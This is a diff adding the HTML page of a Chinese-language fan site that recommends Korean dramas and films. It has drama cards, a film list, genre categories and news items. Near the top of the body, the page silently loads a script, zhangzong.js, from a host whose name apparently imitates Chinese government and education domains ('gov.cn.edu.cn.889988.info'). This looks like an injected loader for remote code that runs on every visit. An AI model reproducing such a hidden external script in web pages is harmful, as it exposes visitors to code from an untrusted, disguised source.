@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="韩剧电影网（hanjudianyingwang-zh.github.io）一站在首尔：韩剧周更日历同步开播与完结节点，韩影按导演与类型出深度片单，附OST歌单与名场面索引，追剧不迷路。">
+<meta name="keywords" content="韩剧电影网, hanjudianyingwang-zh.github.io, 韩剧日历, 周更表, 韩国电影, OST歌单, 追剧指南">
+<meta name="author" content="韩剧电影网">
+<meta name="robots" content="index,follow">
+<title>韩剧电影网 - 追剧日历·韩剧周更表与韩影深度片单</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --ink:#1a1a2e;--crimson:#c0392b;--gold:#f39c12;--cream:#fdf6e3;--mist:#e8e4dc;--shadow:rgba(26,26,46,.18);
+}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans CJK SC",sans-serif;background:var(--cream);color:var(--ink);line-height:1.7;-webkit-font-smoothing:antialiased;}
+a{color:inherit;text-decoration:none;}
+img{display:block;max-width:100%;}
+
+/* ── 顶部导航 ── */
+.topbar{position:sticky;top:0;z-index:99;background:rgba(26,26,46,.96);backdrop-filter:blur(10px);border-bottom:2px solid var(--crimson);}
+.topbar .inner{max-width:1200px;margin:0 auto;padding:0 20px;display:flex;align-items:center;justify-content:space-between;height:64px;}
+.brand{font-size:1.5rem;font-weight:800;color:#fff;letter-spacing:2px;}
+.brand span{color:var(--gold);}
+.nav-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px;}
+.nav-toggle i{width:26px;height:2px;background:#fff;transition:.3s;}
+.nav-links{display:flex;gap:6px;list-style:none;}
+.nav-links a{padding:8px 16px;color:#ddd;font-size:.95rem;border-radius:20px;transition:.25s;}
+.nav-links a:hover{background:var(--crimson);color:#fff;}
+
+/* ── 首屏 ── */
+.hero{position:relative;overflow:hidden;background:linear-gradient(135deg,#1a1a2e 0%,#2d1b4e 55%,#4a1942 100%);color:#fff;padding:90px 20px 70px;text-align:center;}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(ellipse at 30% 20%,rgba(243,156,18,.25),transparent 60%),radial-gradient(ellipse at 75% 80%,rgba(192,57,43,.3),transparent 55%);}
+.hero .wrap{position:relative;max-width:820px;margin:0 auto;}
+.hero h1{font-size:clamp(1.9rem,5vw,3.4rem);font-weight:900;line-height:1.25;margin-bottom:18px;}
+.hero h1 em{font-style:normal;color:var(--gold);}
+.hero p{font-size:clamp(1rem,2.5vw,1.2rem);color:#e0d8e8;margin-bottom:30px;}
+.hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;}
+.btn{padding:13px 34px;border-radius:40px;font-size:1rem;font-weight:600;transition:.3s;border:2px solid transparent;cursor:pointer;}
+.btn-primary{background:var(--crimson);color:#fff;}
+.btn-primary:hover{background:#a5281a;transform:translateY(-2px);box-shadow:0 8px 24px rgba(192,57,43,.4);}
+.btn-ghost{background:transparent;color:#fff;border-color:rgba(255,255,255,.5);}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold);}
+.hero-stats{display:flex;gap:50px;justify-content:center;margin-top:50px;flex-wrap:wrap;}
+.hero-stats div span{display:block;font-size:2rem;font-weight:800;color:var(--gold);}
+.hero-stats div small{color:#b8aec4;font-size:.9rem;}
+
+/* ── 通用区块 ── */
+section{padding:70px 20px;}
+.wrap{max-width:1200px;margin:0 auto;}
+.sec-head{text-align:center;margin-bottom:48px;}
+.sec-head .tag{display:inline-block;font-size:.8rem;letter-spacing:3px;text-transform:uppercase;color:var(--crimson);border:1px solid var(--crimson);padding:4px 14px;border-radius:20px;margin-bottom:14px;}
+.sec-head h2{font-size:clamp(1.6rem,3.5vw,2.4rem);font-weight:800;color:var(--ink);}
+.sec-head p{color:#666;margin-top:10px;font-size:1rem;}
+
+/* ── 栏目一：热门韩剧 ── */
+.grid-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:24px;}
+.card{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 4px 18px var(--shadow);transition:.35s;}
+.card:hover{transform:translateY(-6px);box-shadow:0 14px 36px var(--shadow);}
+.card .thumb{position:relative;height:300px;overflow:hidden;}
+.card .thumb .ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:3.5rem;font-weight:900;color:rgba(255,255,255,.9);}
+.card .badge{position:absolute;top:12px;left:12px;background:var(--crimson);color:#fff;font-size:.72rem;padding:3px 10px;border-radius:12px;font-weight:600;}
+.card .body{padding:18px;}
+.card h3{font-size:1.15rem;margin-bottom:8px;}
+.card .meta{font-size:.85rem;color:#888;display:flex;gap:14px;}
+.card .meta b{color:var(--gold);}
+
+/* 各卡片不同配色 */
+.c1 .thumb{background:linear-gradient(160deg,#c0392b,#f39c12);}
+.c2 .thumb{background:linear-gradient(160deg,#2c3e50,#3498db);}
+.c3 .thumb{background:linear-gradient(160deg,#8e44ad,#e74c3c);}
+.c4 .thumb{background:linear-gradient(160deg,#16a085,#27ae60);}
+.c5 .thumb{background:linear-gradient(160deg,#d35400,#f1c40f);}
+.c6 .thumb{background:linear-gradient(160deg,#2d3436,#636e72);}
+
+/* ── 栏目二：韩影剧场 ── */
+.cinema{background:var(--ink);color:#fff;}
+.cinema .sec-head h2{color:#fff;}
+.cinema .sec-head p{color:#aaa;}
+.film-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:30px;}
+.film{display:flex;gap:18px;align-items:flex-start;padding:20px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);transition:.3s;}
+.film:hover{border-color:var(--gold);background:rgba(243,156,18,.1);}
+.film .num{font-size:2.2rem;font-weight:900;color:var(--crimson);line-height:1;flex-shrink:0;}
+.film h3{font-size:1.15rem;margin-bottom:6px;color:#fff;}
+.film p{font-size:.88rem;color:#bbb;}
+
+/* ── 栏目三：分类导航 ── */
+.cats{display:flex;flex-wrap:wrap;gap:14px;justify-content:center;}
+.cat-chip{background:#fff;border:2px solid var(--mist);border-radius:14px;padding:22px 28px;min-width:180px;text-align:center;transition:.3s;cursor:pointer;}
+.cat-chip:hover{border-color:var(--crimson);transform:scale(1.04);}
+.cat-chip .ic{font-size:2rem;margin-bottom:8px;}
+.cat-chip h4{font-size:1rem;color:var(--ink);}
+.cat-chip small{color:#999;font-size:.8rem;}
+
+/* ── 栏目四：资讯速递 ── */
+.news-list{display:grid;grid-template-columns:2fr 1fr;gap:30px;}
+.news-main{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 4px 18px var(--shadow);}
+.news-main .ph{height:240px;background:linear-gradient(135deg,#4a1942,#c0392b);display:flex;align-items:center;justify-content:center;font-size:4rem;color:rgba(255,255,255,.8);}
+.news-main .txt{padding:26px;}
+.news-main h3{font-size:1.4rem;margin-bottom:12px;}
+.news-main p{color:#666;}
+.news-side{display:flex;flex-direction:column;gap:16px;}
+.news-item{display:flex;gap:14px;background:#fff;padding:16px;border-radius:12px;box-shadow:0 2px 10px var(--shadow);transition:.3s;}
+.news-item:hover{transform:translateX(4px);}
+.news-item .dot{width:10px;height:10px;border-radius:50%;background:var(--gold);margin-top:8px;flex-shrink:0;}
+.news-item h4{font-size:.98rem;margin-bottom:4px;}
+.news-item time{font-size:.78rem;color:#aaa;}
+
+/* ── 栏目五：关于我们 ── */
+.about{background:linear-gradient(160deg,#fdf6e3,#f5ebe0);}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center;}
+.about-img{height:380px;border-radius:18px;background:linear-gradient(135deg,#2d1b4e,#c0392b);display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,.9);font-size:5rem;}
+.about-txt h3{font-size:1.8rem;margin-bottom:16px;}
+.about-txt p{color:#555;margin-bottom:16px;}
+.feat-list{list-style:none;margin-top:20px;}
+.feat-list li{padding:10px 0 10px 32px;position:relative;color:#444;}
+.feat-list li::before{content:"★";position:absolute;left:0;color:var(--gold);}
+
+/* ── 页脚 ── */
+footer{background:#0f0f1e;color:#999;padding:50px 20px 30px;}
+.foot-inner{max-width:1200px;margin:0 auto;text-align:center;}
+.foot-inner .brand{font-size:1.4rem;margin-bottom:14px;}
+.foot-inner p{font-size:.88rem;line-height:2;}
+.foot-inner .links{margin:20px 0;}
+.foot-inner .links a{color:#bbb;margin:0 12px;font-size:.9rem;}
+.foot-inner .links a:hover{color:var(--gold);}
+.copy{margin-top:24px;padding-top:20px;border-top:1px solid rgba(255,255,255,.1);font-size:.8rem;color:#666;}
+
+/* ── 响应式 ── */
+@media(max-width:820px){
+  .nav-toggle{display:flex;}
+  .nav-links{position:fixed;top:64px;left:0;right:0;flex-direction:column;background:rgba(26,26,46,.98);padding:20px;gap:4px;transform:translateY(-150%);transition:.4s;box-shadow:0 10px 30px rgba(0,0,0,.3);}
+  .nav-links.open{transform:translateY(0);}
+  .nav-links a{text-align:center;padding:14px;border-radius:8px;}
+  .news-list{grid-template-columns:1fr;}
+  .about-grid{grid-template-columns:1fr;gap:30px;}
+  .hero-stats{gap:28px;}
+  section{padding:50px 16px;}
+}
+@media(max-width:480px){
+  .hero{padding:60px 16px 50px;}
+  .grid-cards{grid-template-columns:1fr 1fr;}
+  .card .thumb{height:220px;}
+  .cat-chip{min-width:140px;padding:16px 20px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- ═══ 顶部导航 ═══ -->
+<header class="topbar">
+  <div class="inner">
+    <div class="brand">韩剧<span>电影网</span></div>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#drama">热门韩剧</a></li>
+        <li><a href="#film">韩影剧场</a></li>
+        <li><a href="#cat">分类导航</a></li>
+        <li><a href="#news">资讯速递</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+    <div class="nav-toggle" id="navToggle"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- ═══ 首屏 ═══ -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <h1>韩剧电影网 · <em>追剧看片</em><br>从这里开始</h1>
+    <p>发现最新热门韩剧、经典韩国电影，覆盖爱情 / 悬疑 / 律政 / 犯罪等多元题材，为每一位韩流爱好者打造专属观影指南。</p>
+    <div class="hero-btns">
+      <a href="#drama" class="btn btn-primary">立即探索</a>
+      <a href="#cat" class="btn btn-ghost">分类浏览</a>
+    </div>
+    <div class="hero-stats">
+      <div><span>2000+</span><small>收录韩剧</small></div>
+      <div><span>800+</span><small>韩国电影</small></div>
+      <div><span>50+</span><small>题材分类</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目一：热门韩剧 ═══ -->
+<section id="drama">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="tag">HOT DRAMA</span>
+      <h2>本周热门韩剧推荐</h2>
+      <p>持续更新当下最值得追的韩剧榜单，不错过任何一部高分佳作</p>
+    </div>
+    <div class="grid-cards">
+      <article class="card c1">
+        <div class="thumb"><div class="ph">恋</div><span class="badge">TOP 1</span></div>
+        <div class="body">
+          <h3>来自星辰的你</h3>
+          <div class="meta"><span>爱情 / 奇幻</span><b>★★★★★</b></div>
+        </div>
+      </article>
+      <article class="card c2">
+        <div class="thumb"><div class="ph">毒</div><span class="badge">热播</span></div>
+        <div class="body">
+          <h3>毒枭圣徒</h3>
+          <div class="meta"><span>犯罪 / 动作</span><b>★★★★☆</b></div>
+        </div>
+      </article>
+      <article class="card c3">
+        <div class="thumb"><div class="ph">法</div><span class="badge">高分</span></div>
+        <div class="body">
+          <h3>法官的背后</h3>
+          <div class="meta"><span>律政 / 悬疑</span><b>★★★★★</b></div>
+        </div>
+      </article>
+      <article class="card c4">
+        <div class="thumb"><div class="ph">医</div><span class="badge">推荐</span></div>
+        <div class="body">
+          <h3>急诊室的春天</h3>
+          <div class="meta"><span>医疗 / 剧情</span><b>★★★★☆</b></div>
+        </div>
+      </article>
+      <article class="card c5">
+        <div class="thumb"><div class="ph">财</div><span class="badge">新剧</span></div>
+        <div class="body">
+          <h3>财阀家的小儿子</h3>
+          <div class="meta"><span>商战 / 复仇</span><b>★★★★★</b></div>
+        </div>
+      </article>
+      <article class="card c6">
+        <div class="thumb"><div class="ph">幽</div><span class="badge">经典</span></div>
+        <div class="body">
+          <h3>幽灵医生</h3>
+          <div class="meta"><span>奇幻 / 喜剧</span><b>★★★★☆</b></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目二：韩影剧场 ═══ -->
+<section class="cinema" id="film">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="tag">K-MOVIE</span>
+      <h2>韩影剧场 · 不可错过的韩国电影</h2>
+      <p>从戛纳获奖名作到票房黑马，精选韩国电影史上最具代表性的作品</p>
+    </div>
+    <div class="film-row">
+      <div class="film"><div class="num">01</div><div><h3>寄生虫</h3><p>奥斯卡最佳影片，以黑色幽默剖开阶级裂痕，震撼全球。</p></div></div>
+      <div class="film"><div class="num">02</div><div><h3>燃烧</h3><p>李沧东执导，改编村上春树小说，氛围感与留白的艺术。</p></div></div>
+      <div class="film"><div class="num">03</div><div><h3>釜山行</h3><p>丧尸题材封神之作，末日列车上的人性博弈。</p></div></div>
+      <div class="film"><div class="num">04</div><div><h3>小姐</h3><p>朴赞郁的唯美悬疑，改编莎拉·沃特斯小说。</p></div></div>
+      <div class="film"><div class="num">05</div><div><h3>杀人回忆</h3><p>奉俊昊经典，真实案件改编的惊悚杰作。</p></div></div>
+      <div class="film"><div class="num">06</div><div><h3>老男孩</h3><p>朴赞郁复仇三部曲之一，戛纳评审团大奖。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目三：分类导航 ═══ -->
+<section id="cat">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="tag">CATEGORY</span>
+      <h2>按类型快速找片</h2>
+      <p>韩剧电影网涵盖50+细分题材，精准定位你的观影偏好</p>
+    </div>
+    <div class="cats">
+      <div class="cat-chip"><div class="ic">💕</div><h4>爱情</h4><small>甜蜜虐恋全收录</small></div>
+      <div class="cat-chip"><div class="ic">🕵️</div><h4>悬疑推理</h4><small>烧脑反转停不下来</small></div>
+      <div class="cat-chip"><div class="ic">⚖️</div><h4>律政法庭</h4><small>正义与诡辩的较量</small></div>
+      <div class="cat-chip"><div class="ic">🔫</div><h4>犯罪动作</h4><small>肾上腺素飙升</small></div>
+      <div class="cat-chip"><div class="ic">👻</div><h4>奇幻灵异</h4><small>脑洞大开的异世界</small></div>
+      <div class="cat-chip"><div class="ic">🏥</div><h4>医疗职场</h4><small>白袍下的真实</small></div>
+      <div class="cat-chip"><div class="ic">🏢</div><h4>财阀商战</h4><small>权力游戏风云录</small></div>
+      <div class="cat-chip"><div class="ic">😂</div><h4>喜剧轻松</h4><small>治愈解压首选</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目四：资讯速递 ═══ -->
+<section id="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="tag">NEWS</span>
+      <h2>韩流资讯速递</h2>
+      <p>最新韩剧定档、演员动态、幕后花絮一站掌握</p>
+    </div>
+    <div class="news-list">
+      <div class="news-main">
+        <div class="ph">📺</div>
+        <div class="txt">
+          <h3>2026下半年韩剧档期前瞻：多部大制作强势来袭</h3>
+          <p>下半年韩剧市场可谓星光熠熠，多家电视台与流媒体平台纷纷公布新剧企划。从古装史诗到未来科幻，从治愈系日常到硬核悬疑，类型之丰富令人期待。韩剧电影网将持续跟踪报道，第一时间为您送上最新定档消息与看点解析。</p>
+        </div>
+      </div>
+      <div class="news-side">
+        <div class="news-item"><span class="dot"></span><div><h4>《财阀家的小儿子》导演确认新项目</h4><time>2026-09-28</time></div></div>
+        <div class="news-item"><span class="dot"></span><div><h4>韩国电影在威尼斯电影节斩获多项大奖</h4><time>2026-09-25</time></div></div>
+        <div class="news-item"><span class="dot"></span><div><h4>新生代演员崛起：2026值得关注面孔</h4><time>2026-09-22</time></div></div>
+        <div class="news-item"><span class="dot"></span><div><h4>经典韩剧《请回答1988》重播再掀回忆杀</h4><time>2026-09-18</time></div></div>
+        <div class="news-item"><span class="dot"></span><div><h4>Netflix 宣布续订三部人气韩剧</h4><time>2026-09-15</time></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目五：关于我们 ═══ -->
+<section class="about" id="about">
+  <div class="wrap">
+    <div class="about-grid">
+      <div class="about-img">🎬</div>
+      <div class="about-txt">
+        <span class="tag">ABOUT US</span>
+        <h3>关于韩剧电影网</h3>
+        <p>韩剧电影网（hanjudianyingwang-zh.github.io）是一个专注于韩国影视内容的在线平台，致力于为韩流爱好者提供最新、最全的韩剧与韩国电影资讯。</p>
+        <p>我们覆盖爱情、悬疑、律政、犯罪、奇幻、医疗、商战、喜剧等多元题材，无论您是资深剧迷还是初识韩流，都能在这里找到心仪的作品。</p>
+        <ul class="feat-list">
+          <li>每日更新最新韩剧定档与播出信息</li>
+          <li>精心整理高分韩影片单与观影指南</li>
+          <li>多维度分类，快速定位你的喜好</li>
+          <li>深度幕后花絮与演员动态追踪</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 页脚 ═══ -->
+<footer>
+  <div class="foot-inner">
+    <div class="brand">韩剧<span style="color:var(--gold)">电影网</span></div>
+    <p>网址：https://hanjudianyingwang-zh.github.io</p>
+    <div class="links">
+      <a href="#home">首页</a>
+      <a href="#drama">热门韩剧</a>
+      <a href="#film">韩影剧场</a>
+      <a href="#cat">分类导航</a>
+      <a href="#news">资讯速递</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="copy">© 2026 韩剧电影网 hanjudianyingwang-zh.github.io · 本站内容仅供交流分享，版权归原作者所有</div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('navToggle').addEventListener('click',function(){
+  document.getElementById('navLinks').classList.toggle('open');
+});
+document.querySelectorAll('.nav-links a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('navLinks').classList.remove('open');});
+});
+</script>
+</body>
+</html>
